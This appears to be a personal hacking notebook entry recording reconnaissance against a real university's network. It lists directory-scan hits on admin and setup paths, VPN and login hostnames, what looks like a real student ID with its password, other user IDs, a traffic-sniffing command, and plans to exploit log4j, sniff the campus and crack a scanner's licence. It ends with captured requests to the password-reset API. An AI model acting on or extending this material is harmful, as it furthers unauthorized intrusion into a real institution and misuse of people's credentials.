---
tags: [freelancer, hack]
title: The Hack (Get password and tests)
created: '2021-12-22T05:45:58.000Z'
modified: '2022-08-18T16:04:01.502Z'
---

# The Hack (Get password and tests)

dirbuster has found something over  "http://oa.lixin.edu.cn//test/"
+ http://oa.lixin.edu.cn//admin (CODE:301|SIZE:237)                            
+ http://oa.lixin.edu.cn//css (CODE:301|SIZE:235)                              
+ http://oa.lixin.edu.cn//help (CODE:301|SIZE:236)                             
+ http://oa.lixin.edu.cn//images (CODE:301|SIZE:238)                           
+ http://oa.lixin.edu.cn//js (CODE:301|SIZE:234)                               
+ http://oa.lixin.edu.cn//setup (CODE:301|SIZE:237)                            
+ http://oa.lixin.edu.cn//template (CODE:301|SIZE:240)                         
+ http://oa.lixin.edu.cn//test (CODE:301|SIZE:236)                             
+ http://oa.lixin.edu.cn///admin (CODE:301|SIZE:237)                           
+ http://oa.lixin.edu.cn///help (CODE:301|SIZE:236)                            
+ http://oa.lixin.edu.cn///images (CODE:301|SIZE:238)                          
+ http://oa.lixin.edu.cn///script (CODE:301|SIZE:238)  

suspicious:
http://oa.lixin.edu.cn/oanew/sys/taskcenterapp/*default/index.do


portal (even in the internet):
http://202.121.255.3:8080/portal

Scan this website with kali linux.

The Intranet Gateway For Campus: (maybe less hops?)
https://app.topsec.com.cn

mitmdump --mode socks5 --listen-port 8050 -w logs.log --flow-detail 3 --set stream_websocket=true

pdvpn.lixin.edu.cn
pdvpn2.lixin.edu.cn
vpn.lixin.edu.cn
vpn2.lixin.edu.cn

xxb.lixin.edu.cn/jszl/57078.htm

201960630:CHENweiyi0519

https://cas.paas.lixin.edu.cn/cas/login?service=https%3A%2F%2Flxjw.lixin.edu.cn%2Fcas%2Flogin

https://security-center.paas.lixin.edu.cn/find-pwd

20039370

missing puzzle for changing password:

trial user:
201960249

found russia hacker's kali tool site: https://en.kali.tools/all/

apparently we have some issue with log4j and this could be our way in, the damn server.

sniffing the whole damn campus is only possible if we know how to get into the same subnet of all people.

have searched related websites with site:lixin.edu.cn, could get more if keep doing so, using dnsenum.

to get all site links with proper titles, we need to use playwright.

nessus scanner has that 16 ips limitation, we need to crack/patch it first.

to master kali linux, recommend to scrape kali_tools (https://tools.kali.org/) and tutorialspoint (https://www.tutorialspoint.com/kali_linux/index.htm) for kali, or just simply using manpage.

cisco router is untouched till now. need we to scan it?
(intermediate ip addresses)

curl 'https://personal-security-center.paas.lixin.edu.cn/api/v1/personal/open/passwordStrategy/verify' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; CrOS aarch64 14371.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4729.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Chrome OS"' \
  -H 'Origin: https://security-center.paas.lixin.edu.cn' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://security-center.paas.lixin.edu.cn/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"password":"abcdefABC","userId":""}' \
  --compressed

curl 'https://personal-security-center.paas.lixin.edu.cn/api/v1/personal/open/forgotPassword/changePassword' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; CrOS aarch64 14371.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4729.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Chrome OS"' \
  -H 'Origin: https://security-center.paas.lixin.edu.cn' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://security-center.paas.lixin.edu.cn/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"confirmPassword":"abc123ABC","newPassword":"abc123ABC","nonce":"YzhhZmZjYzktNWQ3Ny00MGU1LTg0ODgtYTYzZTMzMDZkMjU0XzE2NDAyNjg5MzcyNTY"}' \
  --compressed
